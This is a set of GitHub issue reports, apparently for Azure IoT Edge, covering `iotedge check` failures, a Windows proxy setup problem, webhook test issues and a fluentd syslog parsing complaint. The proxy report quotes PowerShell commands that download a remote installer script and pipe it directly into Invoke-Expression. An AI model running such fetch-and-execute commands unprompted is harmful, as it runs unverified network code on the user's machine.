  management_uri: "fd://iotedge.mgmt.socket"
  workload_uri: "fd://iotedge.socket"

###############################################################################
# Home Directory
###############################################################################
#
# Configures the home directory for the daemon.
#
###############################################################################

homedir: "/var/lib/iotedge"

###############################################################################
# Moby Container Runtime settings
###############################################################################
#
# uri - configures the uri for the container runtime.
# network - configures the network on which the containers will be created.
#
###############################################################################

moby_runtime:
  uri: "unix:///var/run/docker.sock"
#   network: "azure-iot-edge"
```

2. Run the following command:

```sh
sudo iotedge check --verbose --iothub-hostname https://iothub-name.azure-devices.net
```


## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

Configuration checks
--------------------
√ config.yaml is well-formed - OK
× config.yaml has well-formed connection string - Error
    Device is not using manual provisioning, so Azure IoT Hub hostname needs to be specified with --iothub-hostname
√ container engine is installed and functional - OK
‼ config.yaml has correct hostname - Warning
    config.yaml has hostname AzureIoTEdgeGatewayLinuxVM which does not comply with RFC 1035.

    - Hostname must be between 1 and 255 octets inclusive.
    - Each label in the hostname (component separated by ".") must be between 1 and 63 octets inclusive.
    - Each label must start with an ASCII alphabet character (a-z), end with an ASCII alphanumeric character (a-z, 0-9), and must contain only ASCII alphanumeric characters or hyphens (a-z, 0-9, "-").

    Not complying with RFC 1035 may cause errors during the TLShandshake with modules and downstream devices.
× config.yaml has correct URIs for daemon mgmt endpoint - Error
    Error: could not execute list-modules request: an error occurred trying to connect: Connection refused (os error 111)
        caused by: docker returned exit code: 1, stderr = Error: could not execute list-modules request: an error occurred trying to connect: Connection refused (os error 111)
√ latest security daemon - OK
√ host time is close to real time - OK
√ container time is close to host time - OK
‼ DNS server - Warning
    Container engine is not configured with DNS server setting,which may impact connectivity to IoT Hub.
    Please see https://aka.ms/iotedge-prod-checklist-dns for best practices.
    You can ignore this warning if you are setting DNS server per module in the Edge deployment.
        caused by: Could not open container engine config file /etc/docker/daemon.json
        caused by: No such file or directory (os error 2)
√ production readiness: certificates - OK
√ production readiness: certificates expiry - OK
√ production readiness: container engine - OK
‼ production readiness: logs policy - Warning
    Container engine is not configured to rotate module logs which may cause it run out of disk space.
    Please see https://aka.ms/iotedge-prod-checklist-logs for best practices.
    You can ignore this warning if you are setting log policy per module in the Edge deployment.
        caused by: Could not open container engine config file /etc/docker/daemon.json
        caused by: No such file or directory (os error 2)

Connectivity checks
-------------------
√ host can connect to and perform TLS handshake with DPS endpoint - OK
‼ host can connect to and perform TLS handshake with IoT Hub AMQP port - Warning
    skipping because of previous failures
‼ host can connect to and perform TLS handshake with IoT Hub HTTPS / WebSockets port - Warning
    skipping because of previous failures
‼ host can connect to and perform TLS handshake with IoT Hub MQTT port - Warning
    skipping because of previous failures
‼ container on the default network can connect to IoT Hub AMQP port - Warning
    skipping because of previous failures
‼ container on the default network can connect to IoT Hub HTTPS/ WebSockets port - Warning
    skipping because of previous failures
‼ container on the default network can connect to IoT Hub MQTT port - Warning
    skipping because of previous failures
‼ container on the IoT Edge module network can connect to IoT Hub AMQP port - Warning
    skipping because of previous failures
‼ container on the IoT Edge module network can connect to IoT Hub HTTPS / WebSockets port - Warning
    skipping because of previous failures
‼ container on the IoT Edge module network can connect to IoT Hub MQTT port - Warning
    skipping because of previous failures
× Edge Hub can bind to ports on host - Error
    Could not check current state of Edge Hub container
        caused by: docker returned exit code: 1, stderr = Error: No such object: edgeHub

9 check(s) succeeded.
3 check(s) raised warnings.
3 check(s) raised errors.
9 check(s) were skipped due to errors from other checks.

```
</details>

### Device Information

The host OS I'm using for this IoT Edge Device is the **Azure IoT Edge on Ubuntu** VM image from the Azure Marketplace.

* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: **Ubuntu 16.04**
* Container OS [e.g. Linux containers, Windows containers]: **Linux**

### Runtime Versions
* iotedged [run `iotedge version`]: **iotedge 1.0.8 (`208b2204fd30e856d00b280112422130c104b9f0`)**
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: **3.0.8**

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->

<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<Paste here between the triple backticks>

```
</details>

## Additional Information
N/A
 <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1.
2.
3.
4.

## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

<Paste here between the triple backticks>

```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->

<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<Paste here between the triple backticks>

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.
 <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1.
2.
3.
4.

## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

<Paste here between the triple backticks>

```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->

<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<Paste here between the triple backticks>

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.
 HI, 
Here's my question about proxy. I have setup a windows server as an edge host device (Host OS Windows server 2019 - 1809), but the device is in on-premises environment and this device can access the public network ONLY through the Proxy.
firewall blocks most ports (etc. 8883 5671 blocked but 443 available) so i just follow this guide setup iotedge proxy [https://docs.microsoft.com/en-us/azure/iot-edge/how-to-configure-proxy-support]()

The configuration script like this (proxy server no need username and password)：
- . {Invoke-WebRequest -proxy http://137.55.147.123:10123 -useb aka.ms/iotedge-win} | Invoke-Expression; Deploy-IoTEdge -proxy http://137.55.147.123:10123

- . {Invoke-WebRequest -proxy http://137.55.147.123:10123 -useb aka.ms/iotedge-win} | Invoke-Expression; Initialize-IoTEdge

- [Environment]::SetEnvironmentVariable("HTTP_PROXY", "http://137.55.147.123:10123", [EnvironmentVariableTarget]::Machine)

- reg add HKLM\SYSTEM\CurrentControlSet\Services\iotedge /v Environment /t REG_MULTI_SZ /d https_proxy=http://137.55.147.123:10123

- C:\ProgramData\iotedge\config.yaml
agent:
  name: "edgeAgent"
  type: "docker"
  evn:
    https_proxy: "http://137.55.147.123:10123"
    UpstreamProtocol: "AmqpWs"
  config:
    image: "mcr.microsoft.com/azureiotedge-agent:1.0.8"
    auth: {}

but seems this proxy configuration doesn't work at all... and powershell command "Invoke-WebRequest -proxy http://137.55.147.123:10123" perfect functioning.

I get "iot edge check" log list here:

PS C:\Windows\system32> iotedge check
Configuration checks
--------------------
√ config.yaml is well-formed - OK
√ config.yaml has well-formed connection string - OK
√ container engine is installed and functional - OK
√ Windows host version is supported - OK
‼ config.yaml has correct hostname - Warning
    config.yaml has hostname WIN-9U7UH7898HI which does not comply with RFC 1035.

    - Hostname must be between 1 and 255 octets inclusive.
    - Each label in the hostname (component separated by ".") must be between 1 and 63 octets inclusive.
    - Each label must start with an ASCII alphabet character (a-z), end with an ASCII alphanumeric character (a-z, 0-9), and must contain only ASCII alphanumeric characters or hyphens (a-z, 0-9, "-").

    Not complying with RFC 1035 may cause errors during the TLS handshake with modules and downstream devices.
√ config.yaml has correct URIs for daemon mgmt endpoint - OK
‼ latest security daemon - Warning
    Error while fetching latest versions of edge components: could not send HTTP request
‼ host time is close to real time - Warning
    Could not query NTP server
√ container time is close to host time - OK
‼ DNS server - Warning
    Container engine is not configured with DNS server setting, which may impact connectivity to IoT Hub.
    Please see https://aka.ms/iotedge-prod-checklist-dns for best practices.
    You can ignore this warning if you are setting DNS server per module in the Edge deployment.
‼ production readiness: certificates - Warning
    Device is using self-signed, automatically generated certs.
    Please see https://aka.ms/iotedge-prod-checklist-certs for best practices.
√ production readiness: certificates expiry - OK
√ production readiness: container engine - OK
‼ production readiness: logs policy - Warning
    Container engine is not configured to rotate module logs which may cause it run out of disk space.
    Please see https://aka.ms/iotedge-prod-checklist-logs for best practices.
    You can ignore this warning if you are setting log policy per module in the Edge deployment.

Connectivity checks
-------------------
× host can connect to and perform TLS handshake with IoT Hub AMQP port - Error
    Could not connect to bdbiothub.azure-devices.cn:5671
× host can connect to and perform TLS handshake with IoT Hub HTTPS / WebSockets port - Error
    Could not connect to bdbiothub.azure-devices.cn:443
× host can connect to and perform TLS handshake with IoT Hub MQTT port - Error
    Could not connect to bdbiothub.azure-devices.cn:8883
× container on the IoT Edge module network can connect to IoT Hub AMQP port - Error
    Container on the nat network could not connect to bdbiothub.azure-devices.cn:5671
× container on the IoT Edge module network can connect to IoT Hub HTTPS / WebSockets port - Error
    Container on the nat network could not connect to bdbiothub.azure-devices.cn:443
× container on the IoT Edge module network can connect to IoT Hub MQTT port - Error
    Container on the nat network could not connect to bdbiothub.azure-devices.cn:8883
× Edge Hub can bind to ports on host - Error
    Could not check current state of Edge Hub container

8 check(s) succeeded.
6 check(s) raised warnings. Re-run with --verbose for more details.
7 check(s) raised errors. Re-run with --verbose for more details.


 HI, 
Here's my question about proxy. I have setup a windows server as an edge host device (Host OS Windows server 2019 - 1809), but the device is in on-premises environment and this device can access the public network ONLY through the Proxy.
firewall blocks most ports (etc. 8883 5671 blocked but 443 available) so i just follow this guide setup iotedge proxy [https://docs.microsoft.com/en-us/azure/iot-edge/how-to-configure-proxy-support]()

The configuration script like this (proxy server no need username and password)：
- . {Invoke-WebRequest -proxy http://137.55.147.123:10123 -useb aka.ms/iotedge-win} | Invoke-Expression; Deploy-IoTEdge -proxy http://137.55.147.123:10123

- . {Invoke-WebRequest -proxy http://137.55.147.123:10123 -useb aka.ms/iotedge-win} | Invoke-Expression; Initialize-IoTEdge

- [Environment]::SetEnvironmentVariable("HTTP_PROXY", "http://137.55.147.123:10123", [EnvironmentVariableTarget]::Machine)

- reg add HKLM\SYSTEM\CurrentControlSet\Services\iotedge /v Environment /t REG_MULTI_SZ /d https_proxy=http://137.55.147.123:10123

- C:\ProgramData\iotedge\config.yaml
agent:
  name: "edgeAgent"
  type: "docker"
  evn:
    https_proxy: "http://137.55.147.123:10123"
    UpstreamProtocol: "AmqpWs"
  config:
    image: "mcr.microsoft.com/azureiotedge-agent:1.0.8"
    auth: {}

but seems this proxy configuration doesn't work at all... and powershell command "Invoke-WebRequest -proxy http://137.55.147.123:10123" perfect functioning.

I get "iot edge check" log list here:
--------------------

PS C:\Windows\system32> iotedge check
Configuration checks

√ config.yaml is well-formed - OK
√ config.yaml has well-formed connection string - OK
√ container engine is installed and functional - OK
√ Windows host version is supported - OK
‼ config.yaml has correct hostname - Warning
    config.yaml has hostname WIN-9U7UH7898HI which does not comply with RFC 1035.

    - Hostname must be between 1 and 255 octets inclusive.
    - Each label in the hostname (component separated by ".") must be between 1 and 63 octets inclusive.
    - Each label must start with an ASCII alphabet character (a-z), end with an ASCII alphanumeric character (a-z, 0-9), and must contain only ASCII alphanumeric characters or hyphens (a-z, 0-9, "-").

    Not complying with RFC 1035 may cause errors during the TLS handshake with modules and downstream devices.
√ config.yaml has correct URIs for daemon mgmt endpoint - OK
‼ latest security daemon - Warning
    Error while fetching latest versions of edge components: could not send HTTP request
‼ host time is close to real time - Warning
    Could not query NTP server
√ container time is close to host time - OK
‼ DNS server - Warning
    Container engine is not configured with DNS server setting, which may impact connectivity to IoT Hub.
    Please see https://aka.ms/iotedge-prod-checklist-dns for best practices.
    You can ignore this warning if you are setting DNS server per module in the Edge deployment.
‼ production readiness: certificates - Warning
    Device is using self-signed, automatically generated certs.
    Please see https://aka.ms/iotedge-prod-checklist-certs for best practices.
√ production readiness: certificates expiry - OK
√ production readiness: container engine - OK
‼ production readiness: logs policy - Warning
    Container engine is not configured to rotate module logs which may cause it run out of disk space.
    Please see https://aka.ms/iotedge-prod-checklist-logs for best practices.
    You can ignore this warning if you are setting log policy per module in the Edge deployment.

Connectivity checks
-------------------
× host can connect to and perform TLS handshake with IoT Hub AMQP port - Error
    Could not connect to bdbiothub.azure-devices.cn:5671
× host can connect to and perform TLS handshake with IoT Hub HTTPS / WebSockets port - Error
    Could not connect to bdbiothub.azure-devices.cn:443
× host can connect to and perform TLS handshake with IoT Hub MQTT port - Error
    Could not connect to bdbiothub.azure-devices.cn:8883
× container on the IoT Edge module network can connect to IoT Hub AMQP port - Error
    Container on the nat network could not connect to bdbiothub.azure-devices.cn:5671
× container on the IoT Edge module network can connect to IoT Hub HTTPS / WebSockets port - Error
    Container on the nat network could not connect to bdbiothub.azure-devices.cn:443
× container on the IoT Edge module network can connect to IoT Hub MQTT port - Error
    Container on the nat network could not connect to bdbiothub.azure-devices.cn:8883
× Edge Hub can bind to ports on host - Error
    Could not check current state of Edge Hub container

8 check(s) succeeded.
6 check(s) raised warnings. Re-run with --verbose for more details.
7 check(s) raised errors. Re-run with --verbose for more details.


 <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen
If I modify this ticket body? 

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1.
2.
3.
4.

## Context (Environment)
Trees

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

<Paste here between the triple backticks>

```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 
GitHubThing

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->
Lnlnlnln
<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

Triple bracket

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.

/r \n '
Simply a test issue to make sure the webhook is still doing what it suppose to do.  <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen
If I modify this ticket body? 

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1.
2.
3.
4.

## Context (Environment)
Trees

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

<Paste here between the triple backticks>

```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 
GitHubThing

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->
Lnlnlnln
<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

Triple bracket

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.

/r \n '
Simply a test issue to make sure the webhook is still doing what it suppose to do.  <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen
If I modify this ticket body? 

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1.
2.
3.
4.

## Context (Environment)
Trees

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

<Paste here between the triple backticks>

```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 
GitHubThing

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->
Lnlnlnln
<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

Triple bracket

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.

/r \n '
Simply a test issue to make sure the webhook is still doing what it suppose to do.  <!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1.
2.
3.
4.

## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```

<Paste here between the triple backticks>

```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->

<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<Paste here between the triple backticks>

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.


Simply a test issue to make sure the webhook is still doing what it suppose to do.  TESTING 1


<!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1. one
2. two
3.
4.

## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```
my log
my log 2


```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->

<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<Paste here between the triple backticks>

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.
 TESTING 1


<!--
Hi there! Thank you for discovering and submitting an issue!

A potentially helpful troubleshooting guide may be found at our [Common issues and resolutions](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot) page.
Note: please use your Azure subscription if you need to share any information from your Azure subscription such as connection strings, service names (IoTHub, Provisioning), etc.

Need Support?
* Have a feature request? Please post it on [User Voice](https://feedback.azure.com/forums/907045-azure-iot-edge) to help us prioritize.
* Have a technical question? Ask on [Stack Overflow](https://stackoverflow.com/questions/tagged/azure-iot-edge) with tag "azure-iot-edge".
* Need support? Azure customers with support plans have access to priority technical support directly from the Azure Portal. Support plan details are at: https://azure.microsoft.com/en-us/support/plans/

Provide a general summary of the issue in the Title above
-->
## Expected Behavior
Tell us what should happen

## Current Behavior
Tell us what happens instead of the expected behavior

## Steps to Reproduce
Provide a detailed set of steps to reproduce the bug.
1. one
2. two
3.
4.

## Context (Environment)

### Output of `iotedge check`

<details>
<summary>Click here</summary>

```
my log
my log 2


```
</details>

### Device Information
* Host OS [e.g. Ubuntu 16.04, Ubuntu 18.04, Windows IoT Core]: 
* Architecture [e.g. amd64, arm32, arm64]: 
* Container OS [e.g. Linux containers, Windows containers]: 

### Runtime Versions
* iotedged [run `iotedge version`]: 
* Edge Agent [image tag (e.g. 1.0.0)]: 
* Edge Hub [image tag (e.g. 1.0.0)]: 
* Docker/Moby [run `docker version`]: 

Note: when using Windows containers on Windows, run `docker -H npipe:////./pipe/iotedge_moby_engine version` instead

## Logs
<!--
Please share as many logs as possible. This will help debugging
Follow [diagnostic steps](https://docs.microsoft.com/en-us/azure/iot-edge/troubleshoot#standard-diagnostic-steps) to help extract useful information.
Don't forget to remove any connection string information!
-->

<details>
<summary>iotedged logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-agent logs</summary>

```

<Paste here between the triple backticks>

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<Paste here between the triple backticks>

```
</details>

## Additional Information
Please provide any additional information that may be helpful in understanding the issue.

<---------->
138766222
Setting the plugin's endpoint to a syslog server, the server could receive data but the data were just messy code.
Any advice? Because of this change:

https://github.com/pivotal-cf/fluent-bit-out-syslog/commit/c650ce2ae94d6ffca316d5c95b34da288ec75553

We can not tell the difference between logs from pods and events from objects like deployments. They all look the same. Hi,
I have a setup where I directed pks cluster logs to fluentd aggregator.
The sink is having parameters like:

Spec:
  Enable _ Tls:  false
  Host:          10.x.y.z
  Port:           12345
  Type:          syslog


In the aggregator side I'm using fluentd's standard input parser:
<source>
    @type syslog
    @id   psksyslog_source
    protocol_type tcp
    port 12345
    <parse>
        with_priority true
        message_format rfc5424
    </parse>
    tag  pks.default.syslog
</source>

I keep getting this error in the aggregator side (with different applications I deployed  to my PKS cluster - e,g, nginx, wildfly)
2018-10-19 12:31:27 +0000 [warn]: #0 [psksyslog_source] invalid syslog message: "157 <14>1 2018-10-19T12:30:47.614468+00:00 7d551d68-9559-4645-980a-d93c72f7cccb default/pod/wildfly-54bf7c95bd-jxbgl/wildfly - - -   JBoss Bootstrap Environment"

Basically nothing gets parsed.

